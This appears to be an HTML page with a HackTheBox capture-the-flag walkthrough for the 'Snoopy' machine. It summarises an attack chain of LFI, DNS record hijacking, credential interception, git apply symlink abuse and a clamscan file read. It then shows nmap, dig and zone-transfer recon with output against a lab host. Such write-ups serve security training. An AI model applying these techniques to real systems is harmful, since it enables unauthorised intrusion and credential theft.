
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snoopy - HTB</title>
    <link rel="stylesheet" href="/styles.css">
    <link rel="stylesheet" href="/writeups.css">
</head>
<body>
    <header>
        <nav>
            <ul>
                <li><a href="/index.html">Home</a></li>
                <li><a href="/writeups.html">Writeups</a></li>
                <li><a href="/about.html">About me</a></li>
            </ul>
        </nav>
    </header>
    <section class="writeup-content">
        <div class="container">
            <div class="writeup-panel">
                <img src="/writeups/htb/hard/snoopy/img/snoopy.png" alt="Machine Icon" class="machine-icon-circle">
                <h2>Snoopy - HTB</h2>
                <p class="sex">walkthrough by elswix<p>
                <ul class="machine-links">
                    <li><a href="https://app.hackthebox.com/machines/Snoopy">HackTheBox</a></li>
                </ul>
            </div>
            <div class="writeup-content-main">
                <!-- AquÃ­ va el contenido del writeup -->
                <div class="codehilite"><pre><span></span><code><span class="n">Machine</span><span class="o">:</span><span class="w"> </span><span class="n">Snoopy</span>
<span class="n">Difficult</span><span class="o">:</span><span class="w"> </span><span class="n">Hard</span>
<span class="n">Platform</span><span class="o">:</span><span class="w"> </span><span class="n">HackTheBox</span>
<span class="n">Release</span><span class="o">:</span><span class="w"> </span><span class="n">Released</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mi">05</span><span class="sr">/06/</span><span class="mi">2023</span>
</code></pre><br style="line-height: 0.5;"/></div>
<h3><br/>About Snoopy</h3><br/>
Snoopy is a hard level machine featured on the HackTheBox platform. Initially, our objective entails exploiting a Local File Inclusion vulnerability to extract a key located within the <code>/etc/bind/named.conf</code> file. This key serves as a crucial component, granting us the capability to introduce a DNS Record alteration, consequently directing the "mail.snoopy.htb" subdomain to our designated IP address. This maneuver is akin to a DNS Poisoning attack.<br/><br/>
Subsequently, our task involves initiating a password reset request within the "mattermost" subdomain, with the aim of intercepting the email (SMTP Request) that the machine dispatches to the user in the process of resetting their password.<br/><br/>
<h3><br>Shell as cbrown</br></h3><br>
Subsequent to successfully modifying the user's password, we gain entry to the Mattermost platform. Within the chat interface, we possess the capability to execute commands, with one of them appearing to initiate SSH requests to a specified IP address. Our strategic objective is to intercept these requests with the intent of acquiring credentials using the <code>ssh-mitm</code> tool.<br/><br/>
Upon effectively intercepting these requests, we are able to extract the credentials belonging to the user <code>cbrown</code>, thereby affording us the privilege to establish an SSH connection to the system.<br/><br/>
<h3><br>Shell as sbrown</br></h3><br>
As <code>cbrown</code> user, we have the capability to execute the <code>git apply -v</code> command as the user <code>sbrown.</code> To elevate privileges to the <code>sbrown</code> user, we exploit a vulnerability associated with <code>git apply.</code> This vulnerability leverages symbolic links, enabling us to overwrite system-level files as another user. By manipulating the <code>ssh</code> keys, we successfully overwrite the <code>authorized_keys</code> file of the <code>sbrown</code> user. As a result, we gain SSH access without the need to provide passwords, thereby achieving unauthorized access.<br/><br/>
<h3><br>Shell as root</br></h3><br>
Once again, operating under the user account <code>sbrown</code>, we possess elevated privileges with sudo capabilities, particularly for executing commands as the root user. The specific command at our disposal is <code>clamscan --debug</code>. Our investigative efforts led us to uncover a vulnerability associated with ClamAV's <code>clamscan</code> utility. This vulnerability enables us to exploit the system's sudo privilege, allowing us to read internal files by crafting malicious DMG files. In doing so, we can gain unauthorized access to sensitive files on the system while operating with root-level permissions.<br/><br/>
<h3><br>Recon</br></h3><br>
Before we begin exploiting the services, we need to understand what we're up against. To do this, we will perform a full port scan (65535) on the target machine, specifically filtering for those that are open.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">--</span><span class="k">open</span><span class="w"> </span><span class="o">-</span><span class="n">sS</span><span class="w"> </span><span class="o">--</span><span class="nf">min</span><span class="o">-</span><span class="n">rate</span><span class="w"> </span><span class="mi">5000</span><span class="w"> </span><span class="o">-</span><span class="n">vvv</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="o">-</span><span class="n">Pn</span><span class="w"> </span><span class="mf">10.10.11.212</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">portScan</span>

<span class="n">Nmap</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="mf">10.10.11.212</span>
<span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">REASON</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">63</span>
<span class="mi">53</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="k">domain</span><span class="w">  </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">63</span>
<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">syn</span><span class="o">-</span><span class="n">ack</span><span class="w"> </span><span class="n">ttl</span><span class="w"> </span><span class="mi">63</span>
</code></pre><br style="line-height: 0.5;"/></div>

Once the port scan is complete, we need to determine which services and technologies are running on these ports. Once again, using the <code>nmap</code> tool, we will conduct a comprehensive service scan.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="nx">elswix</span><span class="err">@</span><span class="nx">kali</span><span class="err">$</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sCV</span><span class="w"> </span><span class="o">-</span><span class="nx">p22</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">80</span><span class="w"> </span><span class="m m-Double">10.10.11.2</span><span class="mi">12</span><span class="w"> </span><span class="o">-</span><span class="nx">oN</span><span class="w"> </span><span class="nx">fullScan</span>

<span class="nx">Starting</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">7.9</span><span class="mi">4</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2023-09-22 12:45 -03</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">snoopy</span><span class="p">.</span><span class="nx">htb</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">10.10.11.2</span><span class="mi">12</span><span class="p">)</span>
<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.2</span><span class="mi">2</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>

<span class="nx">PORT</span><span class="w">   </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span><span class="w">     </span><span class="nx">OpenSSH</span><span class="w"> </span><span class="m m-Double">8.9</span><span class="nx">p1</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="w"> </span><span class="mi">3</span><span class="nx">ubuntu0</span><span class="m m-Double">.1</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">protocol</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span><span class="w"> </span>
<span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="nx">ee</span><span class="p">:</span><span class="mi">6</span><span class="nx">b</span><span class="p">:</span><span class="nx">ce</span><span class="p">:</span><span class="nx">c5</span><span class="p">:</span><span class="nx">b6</span><span class="p">:</span><span class="nx">e3</span><span class="p">:</span><span class="nx">fa</span><span class="p">:</span><span class="mi">1</span><span class="nx">b</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="nx">c0</span><span class="p">:</span><span class="mi">3</span><span class="nx">d</span><span class="p">:</span><span class="mi">5</span><span class="nx">f</span><span class="p">:</span><span class="nx">e3</span><span class="p">:</span><span class="nx">f1</span><span class="p">:</span><span class="nx">a1</span><span class="p">:</span><span class="mi">6</span><span class="nx">e</span><span class="w"> </span><span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="mi">54</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="nx">e1</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="mi">9</span><span class="nx">a</span><span class="p">:</span><span class="mi">1</span><span class="nx">a</span><span class="p">:</span><span class="mi">87</span><span class="p">:</span><span class="mi">9</span><span class="nx">c</span><span class="p">:</span><span class="mi">1</span><span class="nx">e</span><span class="p">:</span><span class="mi">99</span><span class="p">:</span><span class="mi">50</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="nx">bf</span><span class="p">:</span><span class="nx">e5</span><span class="p">:</span><span class="nx">ba</span><span class="w"> </span><span class="p">(</span><span class="nx">ED25519</span><span class="p">)</span>
<span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span><span class="w">  </span><span class="nx">ISC</span><span class="w"> </span><span class="nx">BIND</span><span class="w"> </span><span class="m m-Double">9.18.1</span><span class="mi">2</span><span class="o">-</span><span class="mi">0</span><span class="nx">ubuntu0</span><span class="m m-Double">.22.04.1</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="w"> </span><span class="nx">Linux</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">dns</span><span class="o">-</span><span class="nx">nsid</span><span class="p">:</span><span class="w"> </span>
<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="nx">bind</span><span class="p">.</span><span class="nx">version</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">9.18.1</span><span class="mi">2</span><span class="o">-</span><span class="mi">0</span><span class="nx">ubuntu0</span><span class="m m-Double">.22.04.1</span><span class="o">-</span><span class="nx">Ubuntu</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">    </span><span class="nx">nginx</span><span class="w"> </span><span class="m m-Double">1.18.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">SnoopySec</span><span class="w"> </span><span class="nx">Bootstrap</span><span class="w"> </span><span class="nx">Template</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Index</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">nginx</span><span class="o">/</span><span class="m m-Double">1.18.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span>

<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">18.6</span><span class="mi">4</span><span class="w"> </span><span class="nx">seconds</span>
</code></pre><br style="line-height: 0.5;"/></div>

Thanks to the information returned after completing the scan, we can see that there is a web server (HTTP) running, a DNS server on port 53, and an SSH server on port 22.<br/><br/>
Using the "whatweb" tool, I will perform a quick reconnaissance of the web service:<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">whatweb</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="mf">10.10.11.212</span>
<span class="nl">http</span><span class="p">:</span><span class="c1">//10.10.11.212 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@snoopy.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.212], Lightbox, Script, Title[SnoopySec Bootstrap Template - Index], nginx[1.18.0]</span>
</code></pre><br style="line-height: 0.5;"/></div>

We didn't obtain very relevant information, but we did notice a domain <code>snoopy.htb</code>, which we can add to our <code>/etc/hosts</code> file, forcing it to point to the IP address of the target machine.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">hosts</span>
<span class="mf">127.0.0.1</span><span class="w">   </span><span class="n">localhost</span>
<span class="mf">127.0.1.1</span><span class="w">   </span><span class="n">kali</span><span class="p">.</span><span class="n">localhost</span><span class="w">  </span><span class="n">kali</span>

<span class="err">#</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">lines</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">desirable</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">IPv6</span><span class="w"> </span><span class="n">capable</span><span class="w"> </span><span class="n">hosts</span>
<span class="o">::</span><span class="mi">1</span><span class="w">     </span><span class="n">localhost</span><span class="w"> </span><span class="n">ip6</span><span class="o">-</span><span class="n">localhost</span><span class="w"> </span><span class="n">ip6</span><span class="o">-</span><span class="n">loopback</span>
<span class="nl">ff02</span><span class="p">:</span><span class="err">:</span><span class="mi">1</span><span class="w"> </span><span class="n">ip6</span><span class="o">-</span><span class="n">allnodes</span>
<span class="nl">ff02</span><span class="p">:</span><span class="err">:</span><span class="mi">2</span><span class="w"> </span><span class="n">ip6</span><span class="o">-</span><span class="n">allrouters</span>

<span class="err">#</span><span class="w"> </span><span class="n">HackTheBox</span>
<span class="mf">10.10.11.212</span><span class="w"> </span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="w">  </span>
</code></pre><br style="line-height: 0.5;"/></div>
<h3><br>DNS Enumeration</br></h3><br>
First, we will target the DNS service (hosted on port 53). Specifically, the DNS service uses <code>BIND</code> (as we identified in the comprehensive <code>nmap</code> scan), which is the most commonly used DNS server.<br/><br/>
To perform DNS reconnaissance, we have a wide range of tools at our disposal, and in my case, I will use <code>dig</code>.<br/><br/>
<h4>Name Servers</h4>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">dig</span><span class="w"> </span><span class="mf">@10.10.11.212</span><span class="w"> </span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="n">ns</span>

<span class="p">;</span><span class="w"> </span><span class="o">&lt;&lt;&gt;&gt;</span><span class="w"> </span><span class="n">DiG</span><span class="w"> </span><span class="mf">9.18.16</span><span class="mi">-1</span><span class="o">-</span><span class="n">Debian</span><span class="w"> </span><span class="o">&lt;&lt;&gt;&gt;</span><span class="w"> </span><span class="mf">@10.10.11.212</span><span class="w"> </span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="n">ns</span>
<span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">found</span><span class="p">)</span>
<span class="p">;;</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">options</span><span class="o">:</span><span class="w"> </span><span class="o">+</span><span class="n">cmd</span>
<span class="p">;;</span><span class="w"> </span><span class="n">Got</span><span class="w"> </span><span class="n">answer</span><span class="o">:</span>
<span class="p">;;</span><span class="w"> </span><span class="o">-&gt;&gt;</span><span class="n">HEADER</span><span class="o">&lt;&lt;-</span><span class="w"> </span><span class="n">opcode</span><span class="o">:</span><span class="w"> </span><span class="n">QUERY</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="o">:</span><span class="w"> </span><span class="n">NOERROR</span><span class="p">,</span><span class="w"> </span><span class="kt">id</span><span class="o">:</span><span class="w"> </span><span class="mi">6268</span>
<span class="p">;;</span><span class="w"> </span><span class="n">flags</span><span class="o">:</span><span class="w"> </span><span class="n">qr</span><span class="w"> </span><span class="n">aa</span><span class="w"> </span><span class="n">rd</span><span class="p">;</span><span class="w"> </span><span class="n">QUERY</span><span class="o">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">ANSWER</span><span class="o">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="n">AUTHORITY</span><span class="o">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">ADDITIONAL</span><span class="o">:</span><span class="w"> </span><span class="mi">3</span>
<span class="p">;;</span><span class="w"> </span><span class="n">WARNING</span><span class="o">:</span><span class="w"> </span><span class="n">recursion</span><span class="w"> </span><span class="n">requested</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">available</span>

<span class="p">;;</span><span class="w"> </span><span class="n">OPT</span><span class="w"> </span><span class="n">PSEUDOSECTION</span><span class="o">:</span>
<span class="p">;</span><span class="w"> </span><span class="n">EDNS</span><span class="o">:</span><span class="w"> </span><span class="n">version</span><span class="o">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="o">:</span><span class="p">;</span><span class="w"> </span><span class="n">udp</span><span class="o">:</span><span class="w"> </span><span class="mi">1232</span>
<span class="p">;</span><span class="w"> </span><span class="n">COOKIE</span><span class="o">:</span><span class="w"> </span><span class="n">e391b0108c16119901000000650db90d23497e59ba04639b</span><span class="w"> </span><span class="p">(</span><span class="n">good</span><span class="p">)</span>
<span class="p">;;</span><span class="w"> </span><span class="n">QUESTION</span><span class="w"> </span><span class="n">SECTION</span><span class="o">:</span>
<span class="p">;</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">            </span><span class="n">IN</span><span class="w">  </span><span class="n">NS</span>

<span class="p">;;</span><span class="w"> </span><span class="n">ANSWER</span><span class="w"> </span><span class="n">SECTION</span><span class="o">:</span>
<span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">NS</span><span class="w">  </span><span class="n">ns1</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span>
<span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">NS</span><span class="w">  </span><span class="n">ns2</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span>

<span class="p">;;</span><span class="w"> </span><span class="n">ADDITIONAL</span><span class="w"> </span><span class="n">SECTION</span><span class="o">:</span>
<span class="n">ns1</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">A</span><span class="w">   </span><span class="mf">10.0.50.10</span>
<span class="n">ns2</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">A</span><span class="w">   </span><span class="mf">10.0.51.10</span>

<span class="p">;;</span><span class="w"> </span><span class="n">Query</span><span class="w"> </span><span class="n">time</span><span class="o">:</span><span class="w"> </span><span class="mi">144</span><span class="w"> </span><span class="n">msec</span>
<span class="p">;;</span><span class="w"> </span><span class="n">SERVER</span><span class="o">:</span><span class="w"> </span><span class="mf">10.10.11.212</span><span class="err">#</span><span class="mi">53</span><span class="p">(</span><span class="mf">10.10.11.212</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">UDP</span><span class="p">)</span>
<span class="p">;;</span><span class="w"> </span><span class="n">WHEN</span><span class="o">:</span><span class="w"> </span><span class="n">Fri</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="mi">12</span><span class="o">:</span><span class="mi">55</span><span class="o">:</span><span class="mi">34</span><span class="w"> </span><span class="mo">-03</span><span class="w"> </span><span class="mi">2023</span>
<span class="p">;;</span><span class="w"> </span><span class="n">MSG</span><span class="w"> </span><span class="n">SIZE</span><span class="w">  </span><span class="n">rcvd</span><span class="o">:</span><span class="w"> </span><span class="mi">135</span>
</code></pre><br style="line-height: 0.5;"/></div>
<h4>Zone Transfer</h4>
One of the most common attacks against a DNS server is the Zone Transfer attack.<br/><br/>
A Zone Transfer attack is a type of attack in which an attacker attempts to obtain a complete copy of the Domain Name System (DNS) database from an authoritative DNS server. If the DNS server is misconfigured or vulnerable, it may respond to the request and provide the attacker with sensitive information about domain names and their corresponding IP addresses. This allows us to discover subdomains and other valuable information.<br/><br/>
<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">dig</span><span class="w"> </span><span class="mf">@10.10.11.212</span><span class="w"> </span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="n">axfr</span><span class="w"> </span>

<span class="p">;</span><span class="w"> </span><span class="o">&lt;&lt;&gt;&gt;</span><span class="w"> </span><span class="n">DiG</span><span class="w"> </span><span class="mf">9.18.16</span><span class="mi">-1</span><span class="o">-</span><span class="n">Debian</span><span class="w"> </span><span class="o">&lt;&lt;&gt;&gt;</span><span class="w"> </span><span class="mf">@10.10.11.212</span><span class="w"> </span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="w"> </span><span class="n">axfr</span>
<span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">found</span><span class="p">)</span>
<span class="p">;;</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="n">options</span><span class="o">:</span><span class="w"> </span><span class="o">+</span><span class="n">cmd</span>
<span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">SOA</span><span class="w"> </span><span class="n">ns1</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w"> </span><span class="n">ns2</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w"> </span><span class="mi">2022032612</span><span class="w"> </span><span class="mi">3600</span><span class="w"> </span><span class="mi">1800</span><span class="w"> </span><span class="mi">604800</span><span class="w"> </span><span class="mi">86400</span>
<span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">NS</span><span class="w">  </span><span class="n">ns1</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span>
<span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">NS</span><span class="w">  </span><span class="n">ns2</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span>
<span class="n">mattermost</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">  </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">A</span><span class="w">   </span><span class="mf">172.18.0.3</span>
<span class="n">mm</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">      </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">A</span><span class="w">   </span><span class="mf">127.0.0.1</span>
<span class="n">ns1</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">A</span><span class="w">   </span><span class="mf">10.0.50.10</span>
<span class="n">ns2</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">A</span><span class="w">   </span><span class="mf">10.0.51.10</span>
<span class="n">postgres</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">    </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">A</span><span class="w">   </span><span class="mf">172.18.0.2</span>
<span class="n">provisions</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">  </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">A</span><span class="w">   </span><span class="mf">172.18.0.4</span>
<span class="n">www</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">A</span><span class="w">   </span><span class="mf">127.0.0.1</span>
<span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w">     </span><span class="mi">86400</span><span class="w">   </span><span class="n">IN</span><span class="w">  </span><span class="n">SOA</span><span class="w"> </span><span class="n">ns1</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w"> </span><span class="n">ns2</span><span class="p">.</span><span class="n">snoopy</span><span class="p">.</span><span class="n">htb</span><span class="p">.</span><span class="w"> </span><span class="mi">2022032612</span><span class="w"> </span><span class="mi">3600</span><span class="w"> </span><span class="mi">1800</span><span class="w"> </span><span class="mi">604800</span><span class="w"> </span><span class="mi">86400</span>
<span class="p">;;</span><span class="w"> </span><span class="n">Query</span><span class="w"> </span><span class="n">time</span><span class="o">:</span><span class="w"> </span><span class="mi">480</span><span class="w"> </span><span class="n">msec</span>
<span class="p">;;</span><span class="w"> </span><span class="n">SERVER</span><span class="o">:</span><span class="w"> </span><span class="mf">10.10.11.212</span><span class="err">#</span><span class="mi">53</span><span class="p">(</span><span class="mf">10.10.11.212</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="n">TCP</span><span class="p">)</span>
<span class="p">;;</span><span class="w"> </span><span class="n">WHEN</span><span class="o">:</span><span class="w"> </span><span class="n">Fri</span><span class="w"> </span><span class="n">Sep</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="mi">12</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">30</span><span class="w"> </span><span class="mo">-03</span><span class="w"> </span><span class="mi">2023</span>
<span class="p">;;</span><span class="w"> </span><span class="n">XFR</span><span class="w"> </span><span class="n">size</span><span class="o">:</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="n">records</span><span class="w"> </span><span class="p">(</span><span class="n">messages</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="mi">325</span><span class="p">)</span>
</code></pre><br style="line-height: 0.5;"/></div>

We have successfully executed the attack and obtained sensitive information from the DNS server. We can see that a large number of domain names are returned, but we will only add the subdomain <code>mm.snoopy.htb</code> to our <code>/etc/hosts</code> file since the others are not relevant, at least for now.<br/><br/>
<h3><br>Web application</br></h3><br>
When accessing the web service through the browser, we encountered the following:<br/><br/>
